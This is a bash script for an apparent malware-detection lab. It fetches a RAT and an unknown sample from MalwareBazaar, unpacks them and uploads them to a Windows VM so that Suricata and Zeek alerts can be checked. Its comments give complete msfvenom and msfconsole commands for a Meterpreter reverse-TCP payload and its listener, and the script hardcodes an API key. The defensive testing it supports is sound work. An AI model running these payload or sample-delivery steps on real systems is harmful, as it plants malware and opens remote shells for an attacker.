#!/usr/bin/env bash
# fetch_samples.sh
# ================
# Downloads curated malware samples from MalwareBazaar and uploads them
# to the Windows VM's C:\lab\submissions\ folder.
#
# Usage (from luigi@100.123.135.105, inside ~/lab-edr/):
#   bash integration/fetch_samples.sh
#
# Requires: curl, 7z (p7zip-full), vagrant
#
# API key — set via environment variable to avoid committing credentials:
#   export MALWAREBAZAAR_KEY="your_key_here"
# Falls back to the lab default key if not set.
#
# ── Samples and expected detections ──────────────────────────────────────────
#
# ConnectWise.exe (ScreenConnect RAT, 64-bit)
#   → Zeek: TLS session without SNI, JA3 non-browser fingerprint
#   → ET POLICY: remote admin tool detected
#   Note: requires internet access from Windows VM to reach C2.
#         With current routing (default GW = 10.10.1.1), traffic passes
#         through Debian and Suricata inspects it.
#
# Unknown_A.exe (64-bit, family TBD — monitor Kibana after run)
#   → Behavior unknown until executed; check C:\lab\results\ for alerts.
#
# ── Why no WannaCry? ─────────────────────────────────────────────────────────
# WannaCry (SHA256: 44843140…) is a 32-bit PE.
# Windows 11 (64-bit) rejected it with:
#   [WinError 216] This version of %1 is not compatible with the version
#                  of Windows you're running.
# WOW64 (Windows-on-Windows 64-bit compatibility layer) is absent or
# the binary is too old to load.
#
# ── Recommended approach for guaranteed Suricata alerts ──────────────────────
# Real malware needs its C2 server to generate observable network traffic.
# The most reliable approach in a closed lab is Metasploit:
#
#   On Kali:
#     apt install metasploit-framework
#     msfvenom -p windows/x64/meterpreter/reverse_tcp \
#              LHOST=10.10.10.10 LPORT=4444 -f exe -o /tmp/payload.exe
#     vagrant upload /tmp/payload.exe "C:\lab\submissions\payload.exe" windows
#     msfconsole -q -x "use exploit/multi/handler; \
#       set payload windows/x64/meterpreter/reverse_tcp; \
#       set LHOST 10.10.10.10; set LPORT 4444; run"
#
#   Suricata will alert on:
#     ET MALWARE Metasploit Meterpreter (reverse TCP shellcode pattern)
#     ET POLICY Outbound TCP/4444

set -euo pipefail

API="https://mb-api.abuse.ch/api/v1/"
KEY="${MALWAREBAZAAR_KEY:-082e42c0b12bd4be9c40aadbcb67c9f6a52296cabfad5766}"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

# ── Curated samples: SHA256 → destination filename ─────────────────────────────
declare -A SAMPLES=(
  ["d6dac4795a555ac174409e0fc911e18747284480c0e6f5f9f3d79b0bc1c30459"]="ConnectWise.exe"
  ["4e791c25ea3e6fe490e9b53a1b13eaafef56d9cfc75930b380fc49fb843212b9"]="Unknown_A.exe"
)

ok=0

for sha256 in "${!SAMPLES[@]}"; do
  dest_name="${SAMPLES[$sha256]}"
  zip_path="$TMP/sample.zip"

  echo ""
  echo "[${dest_name}]"

  # Download
  curl -s -X POST "$API" \
    --header "Auth-Key: $KEY" \
    -d "query=get_file&sha256_hash=${sha256}" \
    -o "$zip_path"

  # Verify we got a zip (magic bytes 50 4B 03 04), not a JSON error response
  if ! file "$zip_path" | grep -q "Zip archive"; then
    echo "  SKIP — not a zip: $(cat "$zip_path")"
    rm -f "$zip_path"
    continue
  fi

  # Snapshot of files before extraction
  before=$(ls "$TMP")

  # Extract — MalwareBazaar zips use AES-256, requires 7z (not unzip)
  7z e "$zip_path" -pinfected -o"$TMP" -y > /dev/null 2>&1
  rm -f "$zip_path"

  # Find the newly extracted file (diff before/after)
  extracted=""
  for f in "$TMP"/*; do
    fname=$(basename "$f")
    echo "$before" | grep -qxF "$fname" && continue
    [[ -f "$f" ]] || continue
    extracted="$f"
    break
  done

  if [[ -z "$extracted" ]]; then
    echo "  SKIP — extraction produced no file"
    continue
  fi

  # Verify MZ header (valid Windows PE)
  header=$(od -A n -N 2 -t x1 "$extracted" | tr -d ' ')
  if [[ "$header" != "4d5a" ]]; then
    echo "  SKIP — not a valid PE (header: $header)"
    rm -f "$extracted"
    continue
  fi

  size=$(wc -c < "$extracted")
  echo "  OK — ${size} bytes"

  # Rename to readable name and upload
  mv "$extracted" "$TMP/${dest_name}"
  vagrant upload "$TMP/${dest_name}" "C:\\lab\\submissions\\${dest_name}" windows
  echo "  Uploaded → C:\lab\submissions\${dest_name}"
  ok=$((ok+1))
done

echo ""
echo "========================================"
echo "${ok}/${#SAMPLES[@]} samples uploaded to C:\lab\submissions\"
echo ""
echo "Expected detections (lab healthy, Windows routing via Debian):"
echo "  ConnectWise.exe  Zeek: TLS without SNI, JA3 fingerprint"
echo "                   Suricata: ET POLICY remote admin tool"
echo "  Unknown_A.exe    Check C:\lab\results\ after execution"
echo ""
echo "For guaranteed Suricata alerts, see Metasploit instructions above."
